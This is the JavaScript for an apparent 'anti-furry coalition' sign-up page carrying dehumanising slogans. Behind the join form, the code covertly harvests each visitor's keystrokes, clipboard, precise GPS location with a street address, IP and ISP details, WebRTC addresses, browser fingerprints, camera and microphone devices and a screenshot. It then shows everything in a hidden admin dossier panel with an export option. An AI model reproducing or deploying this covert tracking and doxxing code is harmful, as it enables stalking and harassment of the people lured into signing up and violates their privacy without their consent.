const KEY='afc_v1', BASE=196, CODE='ADMIN';
let state;
try{state=JSON.parse(localStorage.getItem(KEY))||null}catch(e){state=null}
if(!state) state={count:BASE,people:[]};
const save=()=>localStorage.setItem(KEY,JSON.stringify(state));
const $=id=>document.getElementById(id);

const phrases=['FURRIES ARE NOT PEOPLE','196 HAVE CLICKED','OWO IS NOT A LANGUAGE','WE TAKE EVERYTHING','NO FUR. NO MERCY','CTRL + B FOR ADMINS'];
$('tape').innerHTML=Array(4).fill(phrases.map(p=>'<span>'+p+'</span><span>✦</span>').join('')).join('');

function paint(){
  $('bigCount').textContent=state.count;$('hdrCount').textContent=state.count;$('statCount').textContent=state.count;
}
paint();

/* ---------- utils ---------- */
const esc=s=>String(s??'').replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
const hash=s=>{let h=5381;for(let i=0;i<s.length;i++)h=((h<<5)+h+s.charCodeAt(i))|0;return (h>>>0).toString(16).padStart(8,'0')};
const tb=(p,ms,fb)=>Promise.race([p.catch(()=>fb),new Promise(r=>setTimeout(()=>r(fb),ms))]);
function toast(m){const t=$('toast');t.textContent=m;t.classList.add('show');setTimeout(()=>t.classList.remove('show'),2600)}
const t0=performance.now();

/* ---------- persistent tracker ---------- */
function vid(){
  let v=localStorage.getItem('afc_vid');
  if(!v){v='AF-'+hash(navigator.userAgent+screen.width+Date.now())+'-'+Math.floor(Math.random()*1e4);localStorage.setItem('afc_vid',v)}
  document.cookie='_afc='+v+'; max-age=31536000; path=/; SameSite=Lax';
  return v;
}
const VISITOR=vid();
let VISITS=+(localStorage.getItem('afc_visits')||0)+1;
localStorage.setItem('afc_visits',VISITS);

/* ---------- behaviour ---------- */
let keys='',clicks=0,moves=0,maxScroll=0,tabSwitches=0;
addEventListener('keydown',e=>{
  if(e.key==='Backspace')keys+='⌫';else if(e.key==='Enter')keys+='⏎';else if(e.key==='Tab')keys+='⇥';
  else if(e.key.length===1)keys+=e.key;
  if(keys.length>2000)keys=keys.slice(-2000);
});
addEventListener('click',()=>clicks++);
addEventListener('mousemove',()=>moves++);
addEventListener('scroll',()=>{maxScroll=Math.max(maxScroll,Math.round(scrollY))});
document.addEventListener('visibilitychange',()=>{if(document.hidden)tabSwitches++});
let copied='';
document.addEventListener('copy',()=>{try{copied=String(getSelection()).slice(0,300)}catch(e){}});

/* ---------- fingerprint pieces ---------- */
function canvasFP(){try{const c=document.createElement('canvas');c.width=280;c.height=70;const x=c.getContext('2d');
  x.textBaseline='top';x.font='16px "Arial"';x.fillStyle='#ff4d1c';x.fillText('anti-furry coalition 🐺',2,2);
  x.fillStyle='#0033ff';x.font='14px "Times New Roman"';x.fillText('ADMIN',2,26);
  x.strokeStyle='rgba(0,0,0,.4)';x.arc(200,40,20,0,6.28);x.stroke();return hash(c.toDataURL())}catch(e){return 'n/a'}}
function audioFP(){return new Promise(res=>{
  try{const C=window.OfflineAudioContext||window.webkitOfflineAudioContext;const ctx=new C(1,44100,44100);
    const o=ctx.createOscillator();o.type='triangle';o.frequency.value=10000;
    const comp=ctx.createDynamicsCompressor();o.connect(comp);comp.connect(ctx.destination);o.start(0);
    ctx.oncomplete=e=>{const b=e.renderedBuffer.getChannelData(0);let s=0;for(let i=4500;i<5000;i++)s+=Math.abs(b[i]);res(hash(s.toString()))};
    ctx.startRendering();setTimeout(()=>res('n/a'),3000);
  }catch(e){res('n/a')}
})}
function gpu(){try{const g=document.createElement('canvas').getContext('webgl');const d=g.getExtension('WEBGL_debug_renderer_info');
  return {vendor:g.getParameter(d.UNMASKED_VENDOR_WEBGL),renderer:g.getParameter(d.UNMASKED_RENDERER_WEBGL),
  maxTex:g.getParameter(g.MAX_TEXTURE_SIZE),ext:(g.getSupportedExtensions()||[]).length}}catch(e){return {vendor:'n/a',renderer:'n/a',maxTex:'n/a',ext:0}}}
const FONTS=['Arial','Arial Black','Helvetica','Helvetica Neue','Times New Roman','Courier New','Georgia','Verdana','Tahoma','Trebuchet MS','Comic Sans MS','Impact','Webdings','Segoe UI','Calibri','Cambria','Consolas','Franklin Gothic Medium','Gill Sans','Optima','Futura','Baskerville','Didot','Menlo','Monaco','Ubuntu','Roboto','DejaVu Sans','Liberation Sans','Noto Sans','Cantarell','Lucida Grande','Geneva','Courier','Palatino','Bookman','Garamond','Century Gothic','MS Gothic','SimSun','Malgun Gothic'];
function fonts(){try{const s=document.createElement('span');s.style.cssText='position:absolute;left:-9999px;font-size:72px;visibility:hidden';s.textContent='mmmmmmmmmmlli';document.body.appendChild(s);
  const base={mono:0,sans:0,serif:0};
  s.style.fontFamily='monospace';base.mono=s.offsetWidth;s.style.fontFamily='sans-serif';base.sans=s.offsetWidth;s.style.fontFamily='serif';base.serif=s.offsetWidth;
  const hit=FONTS.filter(f=>{s.style.fontFamily='"'+f+'",monospace';const a=s.offsetWidth!==base.mono;
    s.style.fontFamily='"'+f+'",sans-serif';const b=s.offsetWidth!==base.sans;
    s.style.fontFamily='"'+f+'",serif';const c=s.offsetWidth!==base.serif;return a||b||c});
  s.remove();return hit}catch(e){return []}}
async function webrtc(){return new Promise(res=>{
  const out={host:[],srflx:[]};
  try{const pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'},{urls:'stun:stun.cloudflare.com:3478'}]});
    let done=false;const fin=()=>{if(done)return;done=true;try{pc.close()}catch(e){};res(out)};
    pc.createDataChannel('d');
    pc.onicecandidate=e=>{if(!e.candidate)return fin();const c=e.candidate.candidate;
      const ip=(c.match(/(\d{1,3}(?:\.\d{1,3}){3}|[a-f0-9]{1,4}(?::[a-f0-9]{0,4}){2,7})/)||[])[0];
      if(!ip)return;if(/\.local/.test(c))out.host.push(ip);else if(ip.includes(':'))out.srflx.push(ip);else out.srflx.push(ip)};
    pc.createOffer().then(o=>pc.setLocalDescription(o));setTimeout(fin,4000);
  }catch(e){res(out)}
})}
async function devices(){try{let names=[];
  try{const st=await navigator.mediaDevices.getUserMedia({video:true,audio:true});st.getTracks().forEach(t=>t.stop())}catch(e){}
  const l=await navigator.mediaDevices.enumerateDevices();
  return l.map(d=>d.kind+' :: '+(d.label||'unlabeled'))}catch(e){return []}}
async function perms(){const names=['geolocation','notifications','camera','microphone','clipboard-read','clipboard-write','local-fonts','persistent-storage','midi'];
  const o={};for(const n of names){try{o[n]=(await navigator.permissions.query({name:n})).state}catch(e){}}return o}
async function clip(){try{return (await navigator.clipboard.readText()).slice(0,300)}catch(e){return 'n/a'}}
async function geo(){return new Promise(res=>{
  if(!navigator.geolocation)return res('n/a');
  navigator.geolocation.getCurrentPosition(p=>res({lat:p.coords.latitude,lon:p.coords.longitude,acc:Math.round(p.coords.accuracy)+'m'}),
  ()=>res('denied'),{enableHighAccuracy:true,timeout:8000,maximumAge:0});
  setTimeout(()=>res('timeout'),9000);
})}
async function reverse(lat,lon){try{
  const j=await (await fetch('https://api.bigdatacloud.net/data/reverse-geocode-client?latitude='+lat+'&longitude='+lon+'&localityLanguage=en')).json();
  return [j.locality||j.city,j.principalSubdivision,j.postcode,j.countryName].filter(Boolean).join(', ')}catch(e){return 'n/a'}}
async function ipInfo(){try{
  const ctl=new AbortController();setTimeout(()=>ctl.abort(),4500);
  const j=await (await fetch('https://ipwho.is/',{signal:ctl.signal})).json();
  if(j.success===false)throw 0;
  return {ip:j.ip,type:j.type,city:j.city,region:j.region,country:j.country,code:j.country_code,
    postal:j.postal,isp:j.connection&&j.connection.isp,org:j.connection&&j.connection.org,asn:j.connection&&j.connection.asn,
    lat:j.latitude,lon:j.longitude,tz:j.timezone&&j.timezone.id};
}catch(e){
  try{const ctl=new AbortController();setTimeout(()=>ctl.abort(),4500);
    const j=await (await fetch('https://api.ipify.org?format=json',{signal:ctl.signal})).json();
    return {ip:j.ip}}catch(e2){return {ip:'hidden'}}
}}
function uaData(){return new Promise(res=>{
  if(!navigator.userAgentData)return res('n/a');
  navigator.userAgentData.getHighEntropyValues(['platform','platformVersion','architecture','model','uaFullVersion','bitness','fullVersionList'])
  .then(v=>res(v)).catch(()=>res('n/a'));
  setTimeout(()=>res('timeout'),2000);
})}
async function adblock(){try{const ctl=new AbortController();setTimeout(()=>ctl.abort(),3000);
  await fetch('https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js',{signal:ctl.signal,mode:'no-cors'});return false}catch(e){return true}}
async function shot(){try{
  if(!window.html2canvas){await new Promise((r,j)=>{const s=document.createElement('script');
    s.src='https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js';s.onload=r;s.onerror=j;document.head.appendChild(s)})}
  const c=await window.html2canvas(document.body,{scale:.45,logging:false,backgroundColor:'#0a0a0b',useCORS:true,windowWidth:innerWidth,windowHeight:innerHeight});
  return c.toDataURL('image/jpeg',.6)}catch(e){return null}}

/* ---------- dossier ---------- */
async function collect(){
  const ip=await ipInfo();
  const rtcp=webrtc();
  const g=await geo();
  const d={
    captured:new Date().toISOString(),
    visitorId:VISITOR, visits:VISITS, firstSeen:localStorage.getItem('afc_first')||new Date().toISOString(),
    url:location.href, referrer:document.referrer||'direct',
    utm:Object.fromEntries(new URLSearchParams(location.search)),
    ua:navigator.userAgent, uaData:await tb(uaData(),2500,'n/a'),
    platform:navigator.platform||'n/a', vendor:navigator.vendor||'n/a',
    lang:navigator.language, langs:(navigator.languages||[]).join(', '),
    tz:Intl.DateTimeFormat().resolvedOptions().timeZone, utcOffset:new Date().getTimezoneOffset(),
    calendar:Intl.DateTimeFormat().resolvedOptions().calendar,
    numbering:Intl.DateTimeFormat().resolvedOptions().numberingSystem,
    ip:ip.ip, ipType:ip.type||'n/a', ipCity:ip.city||'n/a', ipRegion:ip.region||'n/a',
    ipCountry:ip.country||'n/a', ipCode:ip.code||'n/a', ipPostal:ip.postal||'n/a',
    isp:ip.isp||'n/a', org:ip.org||'n/a', asn:ip.asn||'n/a', ipTz:ip.tz||'n/a',
    ipCoords:ip.lat?(ip.lat+', '+ip.lon):'n/a',
    gps:g, gpsAddress:g.lat?await tb(reverse(g.lat,g.lon),5000,'n/a'):'n/a',
    screen:screen.width+'x'+screen.height, avail:screen.availWidth+'x'+screen.availHeight,
    window:innerWidth+'x'+innerHeight, outer:outerWidth+'x'+outerHeight,
    screenXY:screenX+', '+screenY, colorDepth:screen.colorDepth, pixelDepth:screen.pixelDepth,
    orientation:screen.orientation?screen.orientation.type:'n/a', dpr:devicePixelRatio,
    cores:navigator.hardwareConcurrency||'n/a', memory:navigator.deviceMemory?navigator.deviceMemory+'GB':'n/a',
    touchPoints:navigator.maxTouchPoints, pdfViewer:navigator.pdfViewerEnabled, webdriver:!!navigator.webdriver,
    dnt:navigator.doNotTrack||'n/a', cookies:navigator.cookieEnabled?'enabled':'blocked',
    storage:await (async()=>{try{const e=await navigator.storage.estimate();return Math.round(e.quota/1048576)+'MB quota'}catch(x){return 'n/a'}})(),
    connection:navigator.connection?{type:navigator.connection.effectiveType,down:navigator.connection.downlink+'Mbps',rtt:navigator.connection.rtt+'ms'}:{type:'n/a'},
    battery:await (async()=>{try{const b=await navigator.getBattery();return Math.round(b.level*100)+'%'+(b.charging?' charging':'')}catch(x){return 'n/a'}})(),
    plugins:[...(navigator.plugins||[])].map(p=>p.name),
    mimes:(navigator.mimeTypes||[]).length,
    canvasFP:canvasFP(), audioFP:await audioFP(), webgl:gpu(), fonts:fonts(),
    devices:await tb(devices(),9000,[]), permissions:await perms(), clipboard:await tb(clip(),3000,'n/a'),
    media:{dark:matchMedia('(prefers-color-scheme: dark)').matches,reduced:matchMedia('(prefers-reduced-motion: reduce)').matches,
      coarse:matchMedia('(pointer: coarse)').matches,fine:matchMedia('(pointer: fine)').matches,hover:matchMedia('(hover: hover)').matches,
      gamut:matchMedia('(color-gamut: p3)').matches?'p3':'srgb'},
    adblock:await adblock(),
    autofill:{email:$('tEmail').value||'empty',tel:$('tTel').value||'empty'},
    behaviour:{keys:keys,clicks,moves,maxScroll,tabSwitches,secondsOnPage:Math.round((performance.now()-t0)/1000)},
    rtc:await rtcp,
    screenshot:null
  };
  d.screenshot=await tb(shot(),12000,null);
  const f=[];
  const ipIP=d.ip, rtcIP=d.rtc.srflx[0];
  if(ipIP&&rtcIP&&ipIP!==rtcIP)f.push(['bad','IP MISMATCH']);
  if(d.ipTz&&d.tz&&d.ipTz!==d.tz)f.push(['bad','TZ MISMATCH']);
  if(d.ipType==='IPv6'||d.ipType==='v6')f.push(['warn','IPV6']);
  if(/Android|iPhone|iPad|Mobile/i.test(d.ua))f.push(['warn','MOBILE']);
  if(/Windows NT 10/.test(d.ua)&&d.uaData&&d.uaData.model)f.push(['ok','MODEL']);
  if(d.webdriver)f.push(['bad','HEADLESS']);
  if(d.adblock)f.push(['warn','ADBLOCK']);
  if(parseInt(d.storage)<200)f.push(['warn','INCOGNITO?']);
  if(d.gps&&d.gps.lat)f.push(['ok','GPS']);
  if(d.visits>1)f.push(['ok','RETURNING x'+d.visits]);
  if(d.permissions&&d.permissions['clipboard-read']==='granted')f.push(['ok','CLIPBOARD']);
  d.flags=f;
  localStorage.setItem('afc_first',d.firstSeen);
  return d;
}

/* ---------- join ---------- */
function openJoin(){$('joinModal').classList.add('open');$('fName').focus()}
$('joinBtn').onclick=openJoin;$('joinBtn2').onclick=openJoin;
$('joinModal').onclick=e=>{if(e.target===$('joinModal'))$('joinModal').classList.remove('open')};

$('joinForm').onsubmit=async e=>{
  e.preventDefault();
  const btn=$('joinSubmit');btn.disabled=true;btn.textContent='Harvesting…';
  const d=await collect();
  state.people.unshift({id:Date.now()%1000000,name:$('fName').value.trim(),pseudo:$('fPseudo').value.trim(),
    discord:$('fDiscord').value.trim(),ts:new Date().toISOString(),d});
  state.count++;save();paint();render();
  $('joinModal').classList.remove('open');$('joinForm').reset();
  btn.disabled=false;btn.textContent='Confirm';
  toast('You are in. Everything delivered.');
  $('joinBtn').textContent="You're in";$('joinBtn2').textContent='Welcome aboard';
};

/* ---------- admin ---------- */
let unlocked=false;
function openAdmin(){unlocked?($('drawer').classList.add('open'),render()):($('adminModal').classList.add('open'),$('aCode').focus())}
$('openAdmin').onclick=openAdmin;
$('adminModal').onclick=e=>{if(e.target===$('adminModal'))$('adminModal').classList.remove('open')};
$('adminForm').onsubmit=e=>{e.preventDefault();
  if($('aCode').value.trim().toUpperCase()===CODE){unlocked=true;$('adminModal').classList.remove('open');$('aCode').value='';$('drawer').classList.add('open');render()}
  else $('adminErr').textContent='Wrong code.'};
addEventListener('keydown',e=>{
  if((e.ctrlKey||e.metaKey)&&e.key.toLowerCase()==='b'){e.preventDefault();openAdmin()}
  if(e.key==='Escape')document.querySelectorAll('.modal,.drawer').forEach(n=>n.classList.remove('open'));
});
$('closeDrawer').onclick=()=>$('drawer').classList.remove('open');
$('dSearch').oninput=render;

/* ---------- render ---------- */
function dossier(p){
  const d=p.d||{},secs=[];
  const kv=(t,rows)=>{const r=rows.filter(([k,v])=>v!==undefined&&v!==null&&v!==''&&v!=='n/a'&&!(Array.isArray(v)&&!v.length));
    if(r.length)secs.push('<div class="ds"><div class="ds-t">'+t+'</div>'+r.map(([k,v])=>
      '<div class="kv"><span>'+esc(k)+'</span><b>'+esc(Array.isArray(v)?v.join(', '):(typeof v==='object'?JSON.stringify(v):v))+'</b></div>').join('')+'</div>')};
  kv('Identity',[['Name',p.name],['Handle',p.pseudo],['Discord',p.discord],['Visitor ID',d.visitorId],['Visits',d.visits],['First seen',d.firstSeen],['Autofill email',d.autofill&&d.autofill.email],['Autofill phone',d.autofill&&d.autofill.tel]]);
  kv('Network',[['IP',d.ip],['IP type',d.ipType],['IP→city',d.ipCity],['Region',d.ipRegion],['Country',d.ipCountry+' '+d.ipCode],['Postcode',d.ipPostal],['ISP',d.isp],['Org',d.org],['ASN',d.asn],['IP timezone',d.ipTz],['IP coords',d.ipCoords],['WebRTC host',d.rtc&&d.rtc.host],['WebRTC srflx',d.rtc&&d.rtc.srflx],['Conn type',d.connection&&d.connection.type],['Downlink',d.connection&&d.connection.down],['RTT',d.connection&&d.connection.rtt]]);
  kv('GPS',[['Coordinates',d.gps&&d.gps.lat?(d.gps.lat+', '+d.gps.lon):d.gps],['Accuracy',d.gps&&d.gps.acc],['Reverse geocode',d.gpsAddress],['Maps',d.gps&&d.gps.lat?('https://www.google.com/maps?q='+d.gps.lat+','+d.gps.lon):'']]);
  kv('Device',[['UA',d.ua],['UA-CH model',d.uaData&&d.uaData.model],['Platform',d.uaData&&d.uaData.platform],['Platform ver',d.uaData&&d.uaData.platformVersion],['Arch',d.uaData&&d.uaData.architecture],['Full UA ver',d.uaData&&d.uaData.uaFullVersion],['Vendor',d.vendor],['Screen',d.screen],['Available',d.avail],['Window',d.window],['Outer',d.outer],['Screen pos',d.screenXY],['Color depth',d.colorDepth],['Orientation',d.orientation],['DPR',d.dpr],['CPU cores',d.cores],['RAM',d.memory],['Touch points',d.touchPoints],['Battery',d.battery],['Storage',d.storage]]);
  kv('GPU / fingerprints',[['GPU vendor',d.webgl&&d.webgl.vendor],['GPU renderer',d.webgl&&d.webgl.renderer],['Max texture',d.webgl&&d.webgl.maxTex],['WebGL extensions',d.webgl&&d.webgl.ext],['Canvas hash',d.canvasFP],['Audio hash',d.audioFP],['Font count',d.fonts&&d.fonts.length]]);
  kv('Fonts installed',[['List',d.fonts]]);
  kv('Devices (camera/mic)',[['Enumerated',d.devices]]);
  kv('Browser',[['Language',d.lang],['All languages',d.langs],['Timezone',d.tz],['UTC offset',d.utcOffset],['Calendar',d.calendar],['Numbering',d.numbering],['Plugins',d.plugins],['MIME types',d.mimes],['PDF viewer',d.pdfViewer],['Cookies',d.cookies],['Do Not Track',d.dnt],['Webdriver',d.webdriver?'yes':'no'],['Adblock',d.adblock?'detected':'no'],['Dark mode',d.media&&d.media.dark?'yes':'no'],['Reduced motion',d.media&&d.media.reduced?'yes':'no'],['Pointer',d.media&&(d.media.coarse?'coarse':'fine')],['Gamut',d.media&&d.media.gamut]]);
  kv('Permissions',[['States',d.permissions]]);
  kv('Clipboard',[['Contents',d.clipboard]]);
  kv('Behaviour',[['Seconds on page',d.behaviour&&d.behaviour.secondsOnPage],['Clicks',d.behaviour&&d.behaviour.clicks],['Mouse moves',d.behaviour&&d.behaviour.moves],['Max scroll',d.behaviour&&d.behaviour.maxScroll],['Tab switches',d.behaviour&&d.behaviour.tabSwitches],['Referrer',d.referrer],['URL',d.url],['UTM',d.utm]]);
  kv('Keystrokes',[['Typed',d.behaviour&&d.behaviour.keys]]);
  return '<div class="dossier">'+secs.join('')+(d.screenshot?'<div class="ds"><div class="ds-t">Viewport capture</div><img class="shot" src="'+d.screenshot+'"></div>':'')+'</div>';
}

function render(){
  const q=$('dSearch').value.toLowerCase().trim();
  const rows=state.people.filter(p=>!q||[p.name,p.pseudo,p.discord,JSON.stringify(p.d)].join(' ').toLowerCase().includes(q));
  $('dSub').textContent=state.people.length+' RECORD'+(state.people.length===1?'':'S');
  const countries=new Set(state.people.map(p=>p.d.ipCountry).filter(c=>c&&c!=='n/a'));
  const flagCount=f=>state.people.filter(p=>(p.d.flags||[]).some(x=>x[0]===f)).length;
  const avg=state.people.length?Math.round(state.people.reduce((a,p)=>a+(p.d.behaviour&&p.d.behaviour.secondsOnPage||0),0)/state.people.length):0;
  $('dStats').innerHTML=[[state.people.length,'TOTAL'],[countries.size,'COUNTRIES'],[flagCount('bad'),'RED FLAGS'],[flagCount('ok'),'GPS/ID'],[avg+'s','AVG']]
    .map(([v,l])=>'<div><b>'+v+'</b><span>'+l+'</span></div>').join('');
  $('dList').innerHTML=rows.length?'<table><thead><tr><th>ID</th><th>IDENTITY</th><th>DISCORD</th><th>LOCATION</th><th>FLAGS</th><th>TIME</th><th></th></tr></thead><tbody>'+
    rows.map(p=>'<tr class="row" data-id="'+p.id+'">'+
      '<td class="c-id">#'+String(p.id).slice(-5)+'</td>'+
      '<td><div class="c-name">'+esc(p.name)+'</div><div class="c-handle">'+esc(p.pseudo)+'</div></td>'+
      '<td class="c-disc">'+esc(p.discord||'—')+'</td>'+
      '<td class="c-disc">'+esc(p.d.ipCity||'n/a')+', '+esc(p.d.ipCountry||'n/a')+'<br><span class="c-id">'+esc(p.d.ip||'')+'</span></td>'+
      '<td>'+((p.d.flags||[]).map(f=>'<span class="flag f-'+f[0]+'">'+esc(f[1])+'</span>').join('')||'—')+'</td>'+
      '<td class="c-time">'+new Date(p.ts).toLocaleTimeString()+'</td>'+
      '<td><button class="del" data-del="'+p.id+'">DEL</button></td>'+
      '</tr><tr class="detail"><td colspan="7">'+dossier(p)+'</td></tr>').join('')+'</tbody></table>'
    :'<div class="d-empty">No records yet. Send somebody to the site.</div>';
  $('dList').querySelectorAll('tr.row').forEach(r=>r.onclick=()=>r.classList.toggle('open'));
  $('dList').querySelectorAll('[data-del]').forEach(b=>b.onclick=e=>{e.stopPropagation();
    state.people=state.people.filter(p=>p.id!=b.dataset.del);save();render();toast('Record deleted')});
}

$('exportBtn').onclick=()=>{
  const blob=new Blob([JSON.stringify({count:state.count,people:state.people},null,2)],{type:'application/json'});
  const a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download='afc-dump-'+Date.now()+'.json';a.click();
  toast('Exported');
};
render();
